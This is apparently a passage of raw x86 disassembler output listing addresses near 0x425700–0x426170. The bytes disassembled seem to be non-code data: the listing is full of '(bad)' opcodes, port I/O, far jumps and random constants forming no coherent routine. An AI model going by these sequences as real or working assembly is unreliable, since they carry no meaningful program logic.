  42570d:	cmp    BYTE PTR [edi+ebp*4],ah
  425710:	dec    ebp
	...
  425771:	add    BYTE PTR [eax],al
  425773:	add    dh,dl
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0x8eb60d74
  425783:	fadd   DWORD PTR [ebx+0x5000190]
  425789:	add    DWORD PTR [eax],eax
  42578b:	add    BYTE PTR [ebp+edi*4-0x53],bl
  42578f:	cmp    eax,0xb1428e3a
  425794:	leave  
  425795:	xchg   edi,eax
  425796:	jmp    FWORD PTR [edi+0x14]
  425799:	push   0x129ea4a5
  42579e:	cmp    edi,DWORD PTR [esi+0x47866d56]
  4257a4:	fist   WORD PTR [eax-0x3e8338ec]
  4257aa:	mov    ch,0xa4
  4257ac:	pop    es
  4257ad:	and    eax,0xa32d5be4
  4257b2:	mov    bl,cl
  4257b4:	(bad)  [edx-0x17]
  4257b7:	xchg   esp,eax
  4257b8:	ins    BYTE PTR es:[edi],dx
  4257b9:	stos   BYTE PTR es:[edi],al
  4257ba:	and    esi,DWORD PTR [edx+edi*4+0x7a35ae2d]
  4257c1:	lods   al,BYTE PTR ds:[esi]
  4257c2:	and    al,0x3b
  4257c4:	cwde   
  4257c5:	pop    DWORD PTR [edi+0x43ad70d2]
  4257cb:	leave  
  4257cc:	out    dx,eax
  4257cd:	inc    ebx
  4257ce:	sahf   
  4257cf:	das    
  4257d0:	mov    bh,0xee
  4257d2:	mov    bl,0x3c
  4257d4:	gs xor ah,dl
  4257d7:	xchg   ebx,eax
  4257d8:	mov    ecx,0xe50e8c14
  4257dd:	pop    eax
  4257de:	sub    eax,0x22a35c4c
  4257e3:	inc    esi
  4257e4:	xchg   esi,eax
  4257e5:	mov    edi,DWORD PTR [ecx+0x2ecc7021]
  4257eb:	(bad)  
  4257ed:	sbb    ch,BYTE PTR [esi+0x35]
  4257f0:	int    0xd5
  4257f2:	mov    ecx,0x62025cda
  4257f7:	aas    
  4257f8:	xchg   esp,eax
  4257f9:	idiv   ebp
  4257fb:	fsubr  st(6),st
  4257fd:	rcr    BYTE PTR [ecx+0x32bc864e],1
  425803:	test   BYTE PTR [edi+0x7b],bh
  425806:	mov    esi,0xd09a69a2
  42580b:	fild   WORD PTR [edx]
  42580d:	pop    ebp
  42580e:	mov    esp,0x36deb999
  425813:	inc    esp
  425814:	popa   
  425815:	rcr    BYTE PTR [edi-0x7c46d558],0x21
  42581c:	mov    ebx,0xf5669e39
  425821:	ins    BYTE PTR es:[edi],dx
  425822:	cvtps2pd xmm1,QWORD PTR [esi]
  425825:	ins    DWORD PTR es:[edi],dx
  425826:	cdq    
  425827:	sub    eax,0x4827ae9a
  42582c:	push   0x65
  42582e:	loop   0x425812
  425830:	pop    esi
  425831:	jecxz  0x4258ab
  425833:	jl     0x4257dd
  425835:	test   eax,0x5179810a
  42583a:	mov    ebp,0xa82c1498
  42583f:	cdq    
  425840:	enter  0xb442,0x42
  425844:	adc    esi,DWORD PTR [edi-0x40ce41b8]
  42584a:	or     al,0xe5
  42584c:	cmp    BYTE PTR [edi+eiz*1+0x19],bl
  425850:	push   ds
  425851:	mov    eax,ds:0xf7acb1c9
  425856:	mov    ebp,0x3f85b345
  42585b:	(bad)  
  42585c:	jb     0x425828
  42585e:	(bad)  
  42585f:	fisttp QWORD PTR [esi]
  425861:	adc    al,0xd7
  425863:	bound  esi,QWORD PTR [edx-0x1]
  425866:	mov    ch,0xc3
  425868:	cli    
  425869:	cld    
  42586a:	rcr    DWORD PTR [edi*1+0x39e221c0],0xef
  425872:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  425874:	dec    esp
  425875:	xchg   edi,eax
  425876:	xchg   ebp,eax
  425877:	and    DWORD PTR [ecx+0x3e],esp
  42587a:	pop    ecx
  42587b:	xchg   BYTE PTR [edx+0x467711a],cl
  425881:	out    dx,al
  425882:	mov    dh,0x9b
  425884:	sti    
  425885:	fdivr  DWORD PTR [edi-0x5e]
  425888:	jno    0x4258e6
  42588a:	in     eax,0x2a
  42588c:	imul   esi,DWORD PTR [ecx-0x1d],0xc8cf
	...
  4258f3:	add    BYTE PTR [edx+edx*2-0x70],bl
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	cmp    bh,al
  425902:	shl    DWORD PTR [esi+0x19188],cl
  425908:	add    eax,0x59000001
  42590d:	sub    DWORD PTR [esi+ebx*4-0x3903a387],ebx
  425914:	ja     0x425931
  425916:	pop    ss
  425917:	cdq    
  425918:	aam    0x7d
  42591a:	outs   dx,DWORD PTR ds:[esi]
  42591b:	pop    edx
  42591c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42591d:	shl    DWORD PTR [eax-0x41],1
  425920:	jp     0x42599c
  425922:	inc    ebx
  425923:	mov    esi,0x3781741d
  425928:	mov    DWORD PTR [eax],ebx
  42592a:	xchg   BYTE PTR [ebx-0x70],ch
  42592d:	lahf   
  42592e:	xchg   esp,eax
  42592f:	xor    ch,bh
  425931:	pop    esp
  425932:	lds    ecx,FWORD PTR [ecx]
  425934:	icebp  
  425935:	fbld   TBYTE PTR [ebp+0x71a859a4]
  42593b:	ss in  eax,0xda
  42593e:	and    al,0xbe
  425940:	or     ebx,DWORD PTR [esi+0x419bc44f]
  425946:	es dec ebp
  425948:	test   BYTE PTR ds:0x76cdb022,ah
  42594e:	cs push ds
  425950:	fwait
  425951:	adc    BYTE PTR [esi-0x5a],bl
  425954:	out    0x9a,al
  425956:	inc    eax
  425957:	jno    0x42592f
  425959:	pop    ebx
  42595a:	sbb    eax,0x458f8060
  42595f:	add    al,0x63
  425961:	cmc    
  425962:	cmp    BYTE PTR [esi],0x60
  425965:	sub    BYTE PTR [edx-0x36],bl
  425968:	add    eax,0x83b45c75
  42596d:	mov    esi,0xdd84d307
  425972:	pop    DWORD PTR ds:0xa91d0db9
  425978:	mov    WORD PTR [ecx],ss
  42597a:	sbb    eax,0x63dfe621
  42597f:	fld    TBYTE PTR [eax]
  425981:	pop    ebp
  425982:	xchg   ebp,eax
  425983:	pop    DWORD PTR [ebx]
  425985:	(bad)  
  425986:	(bad)  
  425987:	push   esp
  425988:	aad    0xa
  42598a:	jb     0x425982
  42598c:	jb     0x42593a
  42598e:	stos   DWORD PTR es:[edi],eax
  42598f:	fwait
  425990:	pop    es
  425991:	aam    0x7a
  425993:	adc    DWORD PTR [ecx-0x1a],esp
  425996:	imul   cl
  425998:	inc    edi
  425999:	inc    edx
  42599a:	push   0xfffffff1
  42599c:	xlat   BYTE PTR ds:[ebx]
  42599d:	aas    
  42599e:	push   ecx
  42599f:	xchg   ebp,eax
  4259a0:	jbe    0x425934
  4259a2:	lods   eax,DWORD PTR ds:[esi]
  4259a3:	pop    ebp
  4259a4:	ins    DWORD PTR es:[edi],dx
  4259a5:	test   DWORD PTR [ecx],esp
  4259a7:	(bad)  
  4259a8:	fist   DWORD PTR [esi]
  4259aa:	mov    ebp,0xf47b70da
  4259af:	out    0x24,eax
  4259b1:	xchg   BYTE PTR [edx-0x1b],al
  4259b4:	mov    edx,0x6e527322
  4259b9:	push   0xf886eced
  4259be:	not    DWORD PTR [ecx+0x25]
  4259c1:	mov    ch,0x9b
  4259c3:	or     al,cl
  4259c5:	iret   
  4259c6:	sub    edx,DWORD PTR es:[bp+si]
  4259ca:	stos   BYTE PTR es:[edi],al
  4259cb:	mov    ecx,0xe391cdc3
  4259d0:	iret   
  4259d1:	test   DWORD PTR [esi],edx
  4259d3:	mov    dh,0x54
  4259d5:	xor    al,0x12
  4259d7:	repnz fs pop esi
  4259da:	or     eax,0x896994ca
  4259df:	push   eax
  4259e0:	repz inc ebp
  4259e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259e3:	stos   DWORD PTR es:[edi],eax
  4259e4:	jae    0x425a0e
  4259e6:	mov    cl,0xbd
  4259e8:	pop    es
  4259e9:	fwait
  4259ea:	cs out 0x14,al
  4259ed:	sub    dl,BYTE PTR [ecx]
  4259ef:	inc    edx
  4259f0:	shl    DWORD PTR [ebx+0x26a5697c],0xe4
  4259f7:	shl    DWORD PTR [edi],1
  4259f9:	add    edi,DWORD PTR [ecx-0x50a22985]
  4259ff:	mov    esp,0xb65029af
  425a04:	rcl    cl,0x40
  425a07:	adc    bh,dl
  425a09:	repnz sar cl,1
  425a0c:	int3   
  425a0d:	inc    ebx
  425a0e:	push   eax
  425a0f:	test   eax,0x7a
	...
  425a74:	shl    DWORD PTR [ebx+0x4],0x67
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x146e1f09]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	lods   eax,DWORD PTR ds:[esi]
  425a8d:	dec    edx
  425a8e:	icebp  
  425a8f:	rcl    dl,0xc6
  425a92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a93:	push   es
  425a94:	ret    
  425a95:	mov    dh,0x2a
  425a97:	js     0x425a98
  425a99:	jmp    0x425a25
  425a9b:	pop    es
  425a9c:	cwde   
  425a9d:	adc    edx,esi
  425a9f:	sahf   
  425aa0:	cmp    dh,BYTE PTR [edx-0x4e9b8d23]
  425aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425aa7:	xor    DWORD PTR fs:[edi+0x18389f0a],0xce364244
  425ab2:	sbb    al,0xb4
  425ab4:	push   edx
  425ab5:	xchg   ecx,eax
  425ab6:	mov    edi,0x4b11bf27
  425abb:	jle    0x425b2f
  425abd:	and    dh,BYTE PTR [edx+0x26]
  425ac0:	ret    0x72d3
  425ac3:	pushf  
  425ac4:	cli    
  425ac5:	xor    dl,BYTE PTR [ecx+ecx*8+0x1b]
  425ac9:	fnstsw WORD PTR [edx-0x15411c58]
  425acf:	dec    ebp
  425ad0:	push   edx
  425ad1:	sysexit 
  425ad3:	add    eax,0xde5ad133
  425ad8:	dec    ecx
  425ad9:	add    BYTE PTR [ebx-0x4f38c81f],ch
  425adf:	scas   eax,DWORD PTR es:[edi]
  425ae0:	sar    DWORD PTR [ecx+0x60d7f6],1
  425ae6:	push   ss
  425ae7:	and    eax,0xf1f0691f
  425aec:	pop    esi
  425aed:	clc    
  425aee:	int3   
  425aef:	pop    ecx
  425af0:	jle    0x425b58
  425af2:	stos   DWORD PTR es:[edi],eax
  425af3:	shr    BYTE PTR [eax+0x59],cl
  425af6:	(bad)  
  425af8:	adc    eax,0xdaf393e8
  425afd:	test   eax,0x2a2a22a6
  425b02:	adc    al,0x4f
  425b04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b05:	loope  0x425b37
  425b07:	push   0x300b0129
  425b0c:	mov    BYTE PTR ds:0x39a343d5,bl
  425b12:	inc    esp
  425b13:	xor    eax,0xa85dc581
  425b18:	ret    0x15a9
  425b1b:	outs   dx,BYTE PTR ds:[esi]
  425b1c:	int3   
  425b1d:	push   0x73f3d5c7
  425b22:	lods   eax,DWORD PTR ds:[esi]
  425b23:	mov    ebp,0x523ff5d6
  425b28:	int    0x0
  425b2a:	ins    DWORD PTR es:[edi],dx
  425b2b:	dec    esi
  425b2c:	xchg   esp,eax
  425b2d:	scas   al,BYTE PTR es:[edi]
  425b2e:	stos   BYTE PTR es:[edi],al
  425b2f:	lds    esp,FWORD PTR [ebp-0x6d]
  425b32:	cli    
  425b33:	xchg   edi,eax
  425b34:	call   0x60c:0x3da1a2ff
  425b3b:	mov    esp,0xe043c79a
  425b40:	sub    bl,BYTE PTR [eax-0x1f]
  425b43:	pop    edi
  425b44:	imul   esi,DWORD PTR [edx+0x5e],0xca18bb1f
  425b4b:	add    DWORD PTR [edx],0xffffff95
  425b4e:	call   0x3636e0bb
  425b53:	cwde   
  425b54:	mov    eax,0x9f97b17f
  425b59:	adc    DWORD PTR [edx],ebp
  425b5b:	sub    ecx,DWORD PTR [edx+0x266755c1]
  425b61:	sbb    dl,BYTE PTR [edi-0x6accad5b]
  425b67:	sbb    DWORD PTR [edx+0xc570d07],edx
  425b6d:	lahf   
  425b6e:	mov    esi,0xb5e9acf
  425b73:	call   esp
  425b75:	jg     0x425bc1
  425b77:	mov    eax,ds:0xdaf934a5
  425b7c:	jne    0x425b80
  425b7e:	popf   
  425b7f:	scas   eax,DWORD PTR es:[edi]
  425b80:	outs   dx,DWORD PTR ds:[esi]
  425b81:	jo     0x425baf
  425b83:	add    DWORD PTR [edi+0xa],edx
  425b86:	pop    esi
  425b87:	fdiv   st(7),st
  425b89:	or     edi,DWORD PTR [esi+eax*4-0x2420460f]
  425b90:	in     al,0x0
	...
  425bf2:	add    BYTE PTR [eax],al
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	or     al,0x45
  425c02:	cwde   
  425c03:	rcl    BYTE PTR [edx+0x5000193],cl
  425c09:	add    DWORD PTR [eax],eax
  425c0b:	add    BYTE PTR [ecx+0x7a],al
  425c0e:	popa   
  425c0f:	add    BYTE PTR [edx+0x33106ec8],dh
  425c15:	add    DWORD PTR [esi+0x64],ebx
  425c18:	add    al,0xd8
  425c1a:	and    ebp,edi
  425c1c:	jns    0x425c6b
  425c1e:	sub    BYTE PTR [edi],al
  425c20:	cmp    al,0xc
  425c22:	(bad)  
  425c23:	mov    gs,ebx
  425c25:	shl    ah,cl
  425c27:	xchg   DWORD PTR [ebx-0x621cacbe],ebp
  425c2d:	xchg   edi,eax
  425c2e:	popf   
  425c2f:	or     dh,dl
  425c31:	sbb    al,0xda
  425c33:	dec    ebx
  425c34:	popa   
  425c35:	jno    0x425c36
  425c37:	push   ss
  425c38:	loopne 0x425c87
  425c3a:	loopne 0x425bfa
  425c3c:	push   edi
  425c3d:	out    dx,al
  425c3e:	push   eax
  425c3f:	fiadd  DWORD PTR [ecx-0x6c1ab981]
  425c45:	pop    ecx
  425c46:	sub    eax,0xc4607e4e
  425c4b:	ss clc 
  425c4d:	rcr    DWORD PTR [ebx-0x76],cl
  425c50:	push   esp
  425c51:	or     al,BYTE PTR [ecx]
  425c53:	xor    eax,0x7acd47e7
  425c58:	sbb    al,0x84
  425c5a:	addr16 aaa 
  425c5c:	mov    DWORD PTR [edx-0x78abc790],ecx
  425c62:	in     al,0x1c
  425c64:	dec    edx
  425c65:	mov    ebp,DWORD PTR [esp+eiz*8]
  425c68:	arpl   WORD PTR [edi+eiz*1+0x419ee69a],cx
  425c6f:	fistp  QWORD PTR [edi+0x18]
  425c72:	sbb    cl,0xa0
  425c75:	(bad)  
  425c76:	(bad)  
  425c78:	mov    cl,0x81
  425c7a:	xchg   esi,eax
  425c7b:	repz into 
  425c7d:	push   ss
  425c7e:	sbb    bl,cl
  425c80:	scas   eax,DWORD PTR es:[edi]
  425c81:	pop    ebx
  425c82:	dec    edx
  425c83:	repz or BYTE PTR [ecx],cl
  425c86:	mov    eax,ds:0x224d1f62
  425c8b:	fwait
  425c8c:	test   eax,0x84c94265
  425c91:	outs   dx,DWORD PTR ds:[esi]
  425c92:	xchg   DWORD PTR [ebp+0x7e8ae7fa],ecx
  425c98:	sti    
  425c99:	cmp    bl,dl
  425c9b:	test   al,0x26
  425c9d:	mov    edi,0x62b54f24
  425ca2:	in     al,dx
  425ca3:	mov    ebx,0xabc0abc
  425ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ca9:	or     al,0x50
  425cab:	loope  0x425cd1
  425cad:	bound  ebp,QWORD PTR [esi+0xba4e9f1]
  425cb3:	retf   0x7b6e
  425cb6:	cmp    bh,BYTE PTR [edx-0x77]
  425cb9:	es fcom st(3)
  425cbc:	(bad)  
  425cbd:	nop
  425cbe:	push   ds
  425cbf:	or     eax,0xc7a7eec7
  425cc4:	test   al,0x8a
  425cc6:	aaa    
  425cc7:	push   esi
  425cc8:	daa    
  425cc9:	or     BYTE PTR [eax+0x7893b08],cl
  425ccf:	fs xchg ecx,eax
  425cd1:	push   ebp
  425cd2:	adc    bl,bh
  425cd4:	jg     0x425cb3
  425cd6:	mov    eax,0xbe75122f
  425cdb:	mov    ecx,0x222b0fed
  425ce0:	jp     0x425cd7
  425ce2:	jg     0x425c64
  425ce4:	mov    eax,ds:0x1e6e4f7e
  425ce9:	rcr    DWORD PTR [eax-0xc601d85],cl
  425cef:	fist   DWORD PTR [ecx-0x74]
  425cf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425cf3:	or     DWORD PTR [ebx],ebp
  425cf5:	xchg   BYTE PTR [eax],bl
  425cf7:	push   ebx
  425cf8:	and    DWORD PTR [esi],esi
  425cfa:	dec    esi
  425cfb:	repz pusha 
  425cfd:	cmp    DWORD PTR [eax-0x6106fe9d],edx
  425d03:	or     BYTE PTR [eax-0x6f97937],0x90
  425d0a:	push   ds
  425d0b:	into   
  425d0c:	enter  0x6156,0x89
  425d10:	add    eax,DWORD PTR [eax]
	...
  425d72:	add    BYTE PTR [eax],al
  425d74:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x14362051,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0xf000001
  425d8d:	fimul  WORD PTR [edx-0x37]
  425d90:	int    0x3e
  425d92:	mov    WORD PTR [edx],gs
  425d94:	push   edx
  425d95:	repz pop ds
  425d97:	adc    eax,0x7acf9fb
  425d9c:	and    eax,0x93643eab
  425da1:	and    ax,0x4b9c
  425da5:	adc    dh,bl
  425da7:	mov    cl,BYTE PTR [edi+0x3da15e9c]
  425dad:	cmp    DWORD PTR [edx+ecx*8],esp
  425db0:	inc    edi
  425db1:	pop    esp
  425db2:	xchg   BYTE PTR [edi],dh
  425db4:	rcl    DWORD PTR [esi+0x6f],cl
  425db7:	sbb    DWORD PTR [ebx],0x43
  425dba:	dec    esi
  425dbb:	int    0x69
  425dbd:	jbe    0x425de4
  425dbf:	sub    di,WORD PTR fs:[ebx+0x23f862ba]
  425dc7:	and    al,0x47
  425dc9:	jmp    0x425db9
  425dcb:	push   0xffffffb8
  425dcd:	push   0x43f519
  425dd2:	(bad)  
  425dd3:	leave  
  425dd4:	push   edi
  425dd5:	push   0xffffff81
  425dd7:	jns    0x425d9b
  425dd9:	ficom  DWORD PTR ds:0x839c9456
  425ddf:	add    BYTE PTR fs:[esi+0x63],bh
  425de3:	pop    ebp
  425de4:	mov    ah,0x7b
  425de6:	mov    ah,0x4b
  425de8:	sbb    BYTE PTR [ebp-0x2d917ab4],cl
  425dee:	and    DWORD PTR [esi-0x16ab271f],edi
  425df4:	pop    eax
  425df5:	lock xor BYTE PTR [ecx+0x27],cl
  425df9:	jo     0x425dcb
  425dfb:	pop    esp
  425dfc:	mov    eax,ds:0x55bcb4c9
  425e01:	adc    ebx,esi
  425e03:	jno    0x425dab
  425e05:	aad    0x23
  425e07:	out    0x8,al
  425e09:	pop    esp
  425e0a:	nop
  425e0b:	push   cs
  425e0c:	leave  
  425e0d:	xlat   BYTE PTR ds:[ebx]
  425e0e:	test   eax,0xa989ba97
  425e13:	outs   dx,DWORD PTR ds:[esi]
  425e14:	sub    ecx,ecx
  425e16:	jge    0x425e12
  425e18:	cli    
  425e19:	js     0x425dec
  425e1b:	outs   dx,BYTE PTR ds:[esi]
  425e1c:	stos   BYTE PTR es:[edi],al
  425e1d:	pop    ebx
  425e1e:	xor    al,0xc2
  425e20:	mov    ah,0x76
  425e22:	cmc    
  425e23:	pop    esi
  425e24:	xor    DWORD PTR [ebx],ecx
  425e26:	dec    ebx
  425e27:	test   DWORD PTR [ebx+0x35],edi
  425e2a:	jle    0x425e79
  425e2c:	jecxz  0x425e48
  425e2e:	xchg   edi,eax
  425e2f:	or     edx,DWORD PTR [eax]
  425e31:	jmp    FWORD PTR [ecx-0x28]
  425e34:	cdq    
  425e35:	sbb    DWORD PTR [ebx],0xd57960d6
  425e3b:	fst    st(5)
  425e3d:	mov    ebx,0xd2b1a2ab
  425e42:	jb     0x425e5e
  425e44:	(bad)  
  425e45:	nop
  425e46:	push   ecx
  425e47:	call   0xfc31:0xa3e8b4
  425e4e:	push   ss
  425e4f:	ret    0xdbb7
  425e52:	sti    
  425e53:	aaa    
  425e54:	push   es
  425e55:	rcr    BYTE PTR [ebp-0x5a472902],0x45
  425e5c:	or     eax,0xe789debf
  425e61:	or     ebx,ecx
  425e63:	inc    edi
  425e64:	aas    
  425e65:	cmp    al,0x78
  425e67:	shr    bl,1
  425e69:	mov    dh,0x97
  425e6b:	jmp    0x285a:0xe2ca1b70
  425e72:	imul   edx,DWORD PTR [ebx],0x7804a43d
  425e78:	scas   al,BYTE PTR es:[edi]
  425e79:	frstor ds:0x60c7c215
  425e7f:	inc    esi
  425e80:	and    eax,0x9af49911
  425e85:	ret    0x18cb
  425e88:	jle    0x425e0c
  425e8a:	addr16 push esp
  425e8c:	sub    al,BYTE PTR [edi+0x9ec18d]
	...
  425ef2:	add    BYTE PTR [eax],al
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	sbb    DWORD PTR [eax-0x36],0x1959c39
  425f07:	add    BYTE PTR ds:0xab000001,al
  425f0d:	inc    esp
  425f0e:	inc    esi
  425f0f:	test   eax,0x7e461c86
  425f14:	je     0x425f7e
  425f16:	xor    bl,ch
  425f18:	jle    0x425f3e
  425f1a:	cmp    eax,DWORD PTR [ebp-0x39]
  425f1d:	in     eax,dx
  425f1e:	jb     0x425f56
  425f20:	cmovo  ebp,DWORD PTR [ebx]
  425f23:	retf   0x7697
  425f26:	cmp    ebp,esp
  425f28:	(bad)  
  425f2a:	jp     0x425f38
  425f2c:	xchg   esp,eax
  425f2d:	test   DWORD PTR [eax],edx
  425f2f:	sbb    dh,BYTE PTR [edi+0x4dc3f23b]
  425f35:	xor    al,0xf6
  425f37:	iret   
  425f38:	jmp    0xaddd:0xbca7f145
  425f3f:	shr    DWORD PTR [edx-0x72],cl
  425f42:	out    0x9c,al
  425f44:	(bad)  
  425f46:	jne    0x425fa9
  425f48:	test   al,0x59
  425f4a:	cmp    esi,DWORD PTR [ecx]
  425f4c:	add    ebp,DWORD PTR [eax+0x3e1be884]
  425f52:	and    esi,DWORD PTR [ebp+0x1f]
  425f55:	fwait
  425f56:	rcr    BYTE PTR [eax],1
  425f58:	xchg   ebx,eax
  425f59:	fist   DWORD PTR [edi]
  425f5b:	and    ebx,esi
  425f5d:	xor    al,dl
  425f5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f60:	jecxz  0x425f83
  425f62:	(bad)  
  425f63:	push   cs
  425f64:	retf   0x3e18
  425f67:	mov    ah,0x8b
  425f69:	or     cl,BYTE PTR [esi]
  425f6b:	mov    DWORD PTR [edi+0x7f8fd141],edi
  425f71:	clc    
  425f72:	fiadd  DWORD PTR [edx-0x2a]
  425f75:	add    eax,0x8c3446a9
  425f7a:	sbb    DWORD PTR [ecx+0x5f0ec83d],ecx
  425f80:	rol    ebx,cl
  425f82:	jno    0x425fc4
  425f84:	lea    esp,[edx-0x5f]
  425f87:	and    eax,0xc5fd86c
  425f8c:	xor    BYTE PTR [edx-0x7e],bl
  425f8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f90:	arpl   WORD PTR [ecx+ecx*1],cx
  425f93:	outs   dx,DWORD PTR ds:[esi]
  425f94:	xchg   ecx,eax
  425f95:	dec    ebx
  425f96:	sbb    al,0xfa
  425f98:	add    DWORD PTR [eax+edi*4-0x6dd2281b],0xffffff83
  425fa0:	loope  0x425fa9
  425fa2:	pop    ds
  425fa3:	test   DWORD PTR [ecx],edi
  425fa5:	add    ebp,DWORD PTR [ebp-0x5ea95665]
  425fab:	mov    ecx,DWORD PTR [edx+ebx*4]
  425fae:	outs   dx,BYTE PTR ds:[esi]
  425faf:	jmp    0x425f55
  425fb1:	hlt    
  425fb2:	pand   mm3,mm6
  425fb5:	pushf  
  425fb6:	xor    al,0xb8
  425fb8:	push   es
  425fb9:	call   0x72bd0efa
  425fbe:	cmp    ah,0xb1
  425fc1:	aad    0x2f
  425fc3:	inc    ebx
  425fc4:	loop   0x425f6e
  425fc6:	push   0xbcbdbadc
  425fcb:	sbb    eax,0xb585f33c
  425fd0:	xchg   ecx,eax
  425fd1:	je     0x425fed
  425fd3:	pop    edx
  425fd4:	xchg   ebx,eax
  425fd5:	mov    cl,0xb2
  425fd7:	lods   al,BYTE PTR ds:[esi]
  425fd8:	add    edx,DWORD PTR ds:0xbee1c2e8
  425fde:	jne    0x425fa0
  425fe0:	call   0xeb9d:0xffdd3943
  425fe7:	and    bl,al
  425fe9:	jecxz  0x42605b
  425feb:	lods   eax,DWORD PTR ds:[esi]
  425fec:	xor    esi,DWORD PTR [ecx-0x1c]
  425fef:	jbe    0x42600e
  425ff1:	adc    dl,BYTE PTR [edi+ecx*1]
  425ff4:	cs aaa 
  425ff6:	push   esi
  425ff7:	icebp  
  425ff8:	mov    DWORD PTR [esi-0x26],ecx
  425ffb:	push   edi
  425ffc:	scas   al,BYTE PTR es:[edi]
  425ffd:	outs   dx,DWORD PTR ds:[esi]
  425ffe:	and    eax,0x9e4ec3d1
  426003:	nop
  426004:	jmp    0xe922ca2d
  426009:	pop    eax
  42600a:	pop    ebx
  42600b:	mov    ebp,0x88d68658
  426010:	les    eax,FWORD PTR [eax]
	...
  426072:	add    BYTE PTR [eax],al
  426074:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	sti    
  426081:	stos   BYTE PTR es:[edi],al
  426082:	xor    edi,ecx
  426084:	mov    eax,ds:0x5000196
  426089:	add    DWORD PTR [eax],eax
  42608b:	add    BYTE PTR [esi],bl
  42608d:	js     0x4260b9
  42608f:	cmp    cl,BYTE PTR ss:[ecx+0x50]
  426093:	xor    dh,bh
  426095:	cdq    
  426096:	add    BYTE PTR [esp+ebp*1],dh
  426099:	out    0xf5,eax
  42609b:	sub    bl,BYTE PTR [ebx+edx*8-0x61a4dccd]
  4260a2:	add    edx,eax
  4260a4:	addr16 add esp,edi
  4260a7:	push   edi
  4260a8:	in     al,0xc9
  4260aa:	adc    eax,0x5aa77e1c
  4260af:	daa    
  4260b0:	bound  eax,QWORD PTR [ebx+eiz*8-0x4ba62f60]
  4260b7:	xchg   ebx,eax
  4260b8:	cmp    BYTE PTR [ebp+0x38d0dc23],cl
  4260be:	mov    ecx,0x4d9110dc
  4260c3:	jg     0x4260bd
  4260c5:	test   BYTE PTR [edi+ebp*2],bh
  4260c8:	and    DWORD PTR ds:0x79298b71,edx
  4260ce:	jmp    0xfbf6f19d
  4260d3:	mov    edi,ebp
  4260d5:	(bad)  
  4260d6:	and    al,0x6b
  4260d8:	dec    edi
  4260d9:	sbb    cl,ch
  4260db:	outs   dx,BYTE PTR ds:[esi]
  4260dc:	xchg   esp,eax
  4260dd:	dec    eax
  4260de:	in     al,0x21
  4260e0:	sub    eax,edx
  4260e2:	(bad)  
  4260e3:	dec    ebx
  4260e4:	jl     0x426122
  4260e6:	push   edi
  4260e7:	(bad)  
  4260e8:	cmp    bh,BYTE PTR cs:[ebx+0x505573b3]
  4260ef:	add    ebp,DWORD PTR [eax]
  4260f1:	in     al,dx
  4260f2:	pop    ss
  4260f3:	sti    
  4260f4:	cmp    BYTE PTR [ecx+ebp*4],al
  4260f7:	rcr    DWORD PTR [ecx],1
  4260f9:	out    dx,eax
  4260fa:	push   edx
  4260fb:	retf   
  4260fc:	jbe    0x426159
  4260fe:	or     eax,ecx
  426100:	ucomiss xmm0,DWORD PTR [edi-0x10]
  426104:	leave  
  426105:	jge    0x426136
  426107:	mov    eax,DWORD PTR ds:0xfe123bda
  42610d:	and    BYTE PTR [eax+0x2099213a],cl
  426113:	cmp    eax,0x60a25c63
  426118:	div    BYTE PTR [edi+0x7b]
  42611b:	adc    DWORD PTR [ebx],ebx
  42611d:	loope  0x426189
  42611f:	mov    bh,0xae
  426121:	lahf   
  426122:	mov    dl,0xbc
  426124:	div    DWORD PTR [ebx+0x13]
  426127:	xchg   ecx,eax
  426128:	push   es
  426129:	mov    DWORD PTR [esi],0x100ff00a
  42612f:	sar    BYTE PTR [edi],cl
  426131:	(bad)  
  426132:	(bad)  
  426134:	out    dx,al
  426135:	aas    
  426136:	or     al,0x8d
  426138:	(bad)  
  426139:	mov    dh,0xa1
  42613b:	pop    esp
  42613c:	clc    
  42613d:	pop    ds
  42613e:	xchg   esi,eax
  42613f:	into   
  426140:	inc    ebx
  426141:	inc    edx
  426142:	ins    DWORD PTR es:[edi],dx
  426143:	data16 cmp al,BYTE PTR [ebx+ebx*4-0x65]
  426148:	pop    esp
  426149:	mov    ebp,0xead76cb4
  42614e:	retf   
  42614f:	mov    ds:0xce88a928,eax
  426154:	inc    eax
  426155:	jg     0x426184
  426157:	cmp    eax,0xfcc107ef
  42615c:	push   0xffffff85
  42615e:	add    DWORD PTR [esi+0x6d],edx
  426161:	sub    eax,0x49d606d2
  426166:	loop   0x4260fa
  426168:	mov    edx,0x5ee91ce9
  42616d:	xchg   edx,eax
